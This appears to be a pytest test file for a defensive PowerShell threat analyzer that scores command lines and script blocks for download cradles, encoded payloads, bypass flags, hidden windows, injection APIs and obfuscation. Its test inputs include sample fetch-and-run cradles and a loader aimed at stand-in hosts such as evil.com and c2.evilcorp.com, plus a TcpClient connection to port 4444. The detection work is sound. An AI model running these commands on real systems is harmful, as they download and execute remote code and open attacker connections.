"""Unit tests for PowerShell Threat Analyzer and Composite Risk Scorer.

Validates composite risk scoring, cradle detection, bypass flags, hidden window execution,
native API injection detection, obfuscation markers, benign baseline offsets,
safety overrides, and event routing.
"""

from __future__ import annotations

import base64
from datetime import datetime, timezone

import pytest

from app.analyzers.powershell_analyzer import PowerShellThreatAnalyzer
from app.models.events import EventCategory, NormalizedEvent
from app.models.powershell import PowerShellAnalysisResult


def make_test_event(
    event_id: int = 1,
    image: str | None = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    command_line: str | None = None,
    script_block_text: str | None = None,
    computer: str = "WORKSTATION-01",
    user: str | None = "CORP\\Administrator",
    process_guid: str | None = "{12345678-ABCD-EF01-2345-6789ABCDEF01}",
    record_id: int = 100,
) -> NormalizedEvent:
    """Helper fixture to construct NormalizedEvent for testing."""
    return NormalizedEvent(
        event_id=event_id,
        record_id=record_id,
        provider="Microsoft-Windows-Sysmon" if event_id == 1 else "Microsoft-Windows-PowerShell",
        channel="Microsoft-Windows-Sysmon/Operational" if event_id == 1 else "Microsoft-Windows-PowerShell/Operational",
        computer=computer,
        timestamp=datetime(2026, 11, 4, 12, 0, 0, tzinfo=timezone.utc),
        event_category=EventCategory.PROCESS if event_id in (1, 4688) else EventCategory.POWERSHELL,
        event_type="ProcessCreate" if event_id in (1, 4688) else "ScriptBlock",
        image=image,
        command_line=command_line,
        script_block_text=script_block_text,
        user=user,
        process_guid=process_guid,
        raw_payload="<xml>test</xml>",
        event_hash="test-hash-12345",
    )


def test_powershell_analysis_result_model_and_mappings() -> None:
    """Test 1: Verify PowerShellAnalysisResult serialization into alert and evidence dictionaries."""
    ts = datetime(2026, 11, 4, 12, 0, 0, tzinfo=timezone.utc)
    res = PowerShellAnalysisResult(
        event_id=1,
        record_id=42,
        event_db_id=101,
        computer="SEC-ENDPOINT",
        timestamp_utc=ts,
        process_guid="{AAAA-BBBB-CCCC}",
        user="CORP\\Alice",
        raw_command="powershell.exe -enc AAAA",
        decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
        deobfuscated_command="IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
        risk_score=90,
        severity="Critical",
        indicators=["Base64Payload", "DownloadCradle", "ExecutionPolicyBypass"],
        matched_patterns={
            "Base64Payload": ["-enc AAAA"],
            "DownloadCradle": ["Net.WebClient", "DownloadString"],
        },
        mitre_tactics=["Execution", "Defense Evasion", "Command and Control"],
        mitre_techniques=["T1059.001", "T1027", "T1105"],
        investigation_steps=["Inspect parent process tree", "Review network logs"],
    )

    alert_dict = res.to_alert_dict()
    assert alert_dict["rule_id"] == "PWSH-COMPOSITE-001"
    assert "Critical" in alert_dict["title"]
    assert alert_dict["severity"] == "Critical"
    assert alert_dict["computer"] == "SEC-ENDPOINT"
    assert alert_dict["user"] == "CORP\\Alice"
    assert alert_dict["process_guid"] == "{AAAA-BBBB-CCCC}"
    assert "T1059.001" in alert_dict["mitre_techniques"]
    assert "Base64Payload" in alert_dict["description"]

    evidence_list = res.to_evidence_dicts(alert_id=500)
    assert len(evidence_list) >= 4
    # All evidence rows should link to the SQLite event_db_id
    assert all(e["alert_id"] == 500 for e in evidence_list)
    assert all(e["event_id"] == 101 for e in evidence_list)

    fields = [e["matched_field"] for e in evidence_list]
    assert "command_line" in fields
    assert "decoded_command" in fields
    assert "risk_score" in fields


def test_download_cradle_detection() -> None:
    """Test 2: Verify download cradle detection (+40 weight)."""
    analyzer = PowerShellThreatAnalyzer()
    cradles = [
        "New-Object Net.WebClient; (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
        "Invoke-WebRequest -Uri 'http://evil.com/shell.exe' -OutFile 'C:\\temp\\shell.exe'",
        "iwr -Uri http://evil.com/run.ps1 | iex",
        "Start-BitsTransfer -Source http://bad.com/file -Destination C:\\tools\\file.exe",
        "irm http://malware.org/loader.ps1 | iex",
        "Invoke-RestMethod -Uri http://malware.org/data",
        "[System.Net.Sockets.TcpClient]$client = New-Object System.Net.Sockets.TcpClient('10.0.0.1', 4444)",
    ]

    for cmd in cradles:
        res = analyzer.analyze_text(cmd)
        assert "DownloadCradle" in res.indicators, f"Failed detecting cradle in: {cmd}"
        assert res.risk_score >= 40


def test_base64_payload_detection() -> None:
    """Test 3: Verify Base64 encoded command detection (+30 weight)."""
    analyzer = PowerShellThreatAnalyzer()
    raw = "Write-Host 'Testing Encoded'"
    b64 = base64.b64encode(raw.encode("utf-16-le")).decode("ascii")
    cmd = f"powershell.exe -NoProfile -enc {b64}"

    res = analyzer.analyze_text(cmd)
    assert "Base64Payload" in res.indicators
    assert res.decoded_command == raw
    # Base64 (+30) + NoProfile (+20) = 50 -> Medium
    assert res.risk_score >= 50
    assert res.severity == "Medium"


def test_execution_policy_bypass_detection() -> None:
    """Test 4: Verify execution policy bypass flags (+20 weight)."""
    analyzer = PowerShellThreatAnalyzer()
    variants = [
        "powershell.exe -ep bypass -File run.ps1",
        "powershell.exe -executionpolicy unrestricted -File run.ps1",
        "powershell.exe -nop -File run.ps1",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass",
    ]

    for cmd in variants:
        res = analyzer.analyze_text(cmd)
        assert "ExecutionPolicyBypass" in res.indicators, f"Failed detecting bypass in: {cmd}"
        assert res.risk_score >= 20


def test_hidden_window_detection() -> None:
    """Test 5: Verify hidden / non-interactive window execution (+20 weight)."""
    analyzer = PowerShellThreatAnalyzer()
    variants = [
        "powershell.exe -w hidden -Command test",
        "powershell.exe -windowstyle hidden -Command test",
        "powershell.exe -w 1 -Command test",
        "powershell.exe -noni -Command test",
        "powershell.exe -noninteractive -Command test",
    ]

    for cmd in variants:
        res = analyzer.analyze_text(cmd)
        assert "HiddenWindow" in res.indicators, f"Failed detecting hidden window in: {cmd}"
        assert res.risk_score >= 20


def test_suspicious_native_api_detection() -> None:
    """Test 6: Verify suspicious native memory and injection APIs (+30 weight)."""
    analyzer = PowerShellThreatAnalyzer()
    apis = [
        "VirtualAlloc",
        "VirtualProtect",
        "WriteProcessMemory",
        "CreateThread",
        "RtlMoveMemory",
        "GetProcAddress",
        "LoadLibrary",
        "QueueUserAPC",
        "MapViewOfFile",
    ]

    for api in apis:
        cmd = f"$addr = [NativeMethods]::{api}(...)"
        res = analyzer.analyze_text(cmd)
        assert "SuspiciousNativeApi" in res.indicators, f"Failed detecting API: {api}"
        assert res.risk_score >= 30


def test_obfuscation_detection() -> None:
    """Test 7: Verify obfuscation markers (+15 weight)."""
    analyzer = PowerShellThreatAnalyzer()
    cases = [
        # Excessive backticks (>3)
        "I`E`X `N`e`w-`O`b`j`e`c`t",
        # Concatenation chain
        "'d'+'own'+'load'",
        # Format string
        '("{1}{0}" -f "load","down")',
        # [char[]] conversion
        "[char[]](100,111,119,110) -join ''",
        # [convert]::FromBase64String
        "[System.Convert]::FromBase64String('AAAA')",
        # -join operator
        "('d','o','w','n') -join ''",
    ]

    for cmd in cases:
        res = analyzer.analyze_text(cmd)
        assert "ObfuscationTechniques" in res.indicators, f"Failed detecting obfuscation in: {cmd}"
        assert res.risk_score >= 15


def test_composite_risk_score_aggregation_and_clamping() -> None:
    """Test 8: Verify composite scoring correctly aggregates indicator weights and clamps to 0..100."""
    analyzer = PowerShellThreatAnalyzer()
    # Malicious multi-indicator command:
    # Cradle (+40) + Base64 (+30) + Bypass (+20) + Hidden (+20) + Obfuscation (+15) = 125 -> Clamped to 100
    inner = "I`E`X `N`e`w-`O`b`j`e`c`t (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
    cmd = f"powershell.exe -w hidden -ep bypass -nop -enc {b64}"

    res = analyzer.analyze_text(cmd)
    assert res.risk_score == 100
    assert res.severity == "Critical"
    assert "DownloadCradle" in res.indicators
    assert "Base64Payload" in res.indicators
    assert "ExecutionPolicyBypass" in res.indicators
    assert "HiddenWindow" in res.indicators
    assert "ObfuscationTechniques" in res.indicators


def test_tiered_severity_mapping() -> None:
    """Test 9: Verify tiered severity brackets (Informational: 0-29, Medium: 30-59, High: 60-84, Critical: 85-100)."""
    analyzer = PowerShellThreatAnalyzer()

    # Informational: single bypass flag (20 points)
    res_info = analyzer.analyze_text("powershell.exe -nop -File test.ps1")
    assert res_info.risk_score == 20
    assert res_info.severity == "Informational"

    # Medium: Base64 payload without other flags (30 points)
    inner = "Write-Host 'hello'"
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
    res_med = analyzer.analyze_text(f"powershell.exe -enc {b64}")
    assert res_med.risk_score == 30
    assert res_med.severity == "Medium"

    # High: Base64 payload (+30) + Download Cradle (+40) = 70 points
    inner_cradle = "(New-Object Net.WebClient).DownloadFile('http://bad.com', 'a.exe')"
    b64_cradle = base64.b64encode(inner_cradle.encode("utf-16-le")).decode("ascii")
    res_high = analyzer.analyze_text(f"powershell.exe -enc {b64_cradle}")
    assert res_high.risk_score == 70
    assert res_high.severity == "High"

    # Critical: Base64 (+30) + Cradle (+40) + Hidden (+20) = 90 points
    res_crit = analyzer.analyze_text(f"powershell.exe -w hidden -enc {b64_cradle}")
    assert res_crit.risk_score == 90
    assert res_crit.severity == "Critical"


def test_benign_administrative_offset() -> None:
    """Test 10: Verify benign administrative cmdlets receive -30 offset to avoid false positives."""
    analyzer = PowerShellThreatAnalyzer()
    # Benign administrative command using -NoProfile (+20) with Get-Process (-30) -> 20 - 30 = -10 -> clamped to 0
    cmd = "powershell.exe -NoProfile -Command Get-Process | Select-Object Name, CPU"
    res = analyzer.analyze_text(cmd)
    assert res.risk_score == 0
    assert res.severity == "Informational"
    assert "BenignAdministrativeOffset" in res.indicators

    # Maintenance script with $PSScriptRoot and Get-Service
    script = "$PSScriptRoot\\run.ps1; Get-Service -Name Spooler"
    res2 = analyzer.analyze_text(script)
    assert res2.risk_score == 0
    assert res2.severity == "Informational"


def test_active_threat_safety_override() -> None:
    """Test 11: Verify safety override nullifies administrative negative offset if active cradle or native API is present."""
    analyzer = PowerShellThreatAnalyzer()
    # Attacker tries evasion by appending Get-Process to a download cradle:
    # Cradle (+40). Benign Get-Process normally gives -30, but Safety Override prevents it!
    # Score should remain 40 (or higher), not reduced to 10.
    evasion_cmd = "Get-Process notepad; (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
    res = analyzer.analyze_text(evasion_cmd)
    assert "DownloadCradle" in res.indicators
    assert "BenignAdministrativeOffset" not in res.indicators
    assert res.risk_score >= 40
    assert res.severity in ("Medium", "High", "Critical")


def test_script_block_eid4104_analysis() -> None:
    """Test 12: Verify multi-line script-block parsing from EID 4104 correctly evaluates threat patterns."""
    analyzer = PowerShellThreatAnalyzer()
    multi_line_script = """
    # Stage 2 payload loader
    $url = "http://c2.evilcorp.com/beacon.bin"
    $wc = New-Object Net.WebClient
    $data = $wc.DownloadData($url)
    $mem = [System.Runtime.InteropServices.Marshal]::VirtualAlloc(0, $data.Length, 0x1000, 0x40)
    """

    event = make_test_event(
        event_id=4104,
        image=None,
        command_line=None,
        script_block_text=multi_line_script,
    )

    res = analyzer.analyze_event(event, event_db_id=888)
    assert res is not None
    assert res.event_id == 4104
    assert res.event_db_id == 888
    assert "DownloadCradle" in res.indicators
    assert "SuspiciousNativeApi" in res.indicators
    # Cradle (40) + API (30) = 70 -> High
    assert res.risk_score >= 70
    assert res.severity in ("High", "Critical")


def test_non_powershell_events_return_none() -> None:
    """Test 13: Verify non-PowerShell events are ignored and return None."""
    analyzer = PowerShellThreatAnalyzer()

    # Generic process creation like cmd.exe
    cmd_event = make_test_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c echo hello",
    )
    assert analyzer.analyze_event(cmd_event) is None

    # Unrelated event without script block or powershell image
    notepad_event = make_test_event(
        event_id=1,
        image="C:\\Windows\\System32\\notepad.exe",
        command_line="notepad.exe file.txt",
    )
    assert analyzer.analyze_event(notepad_event) is None
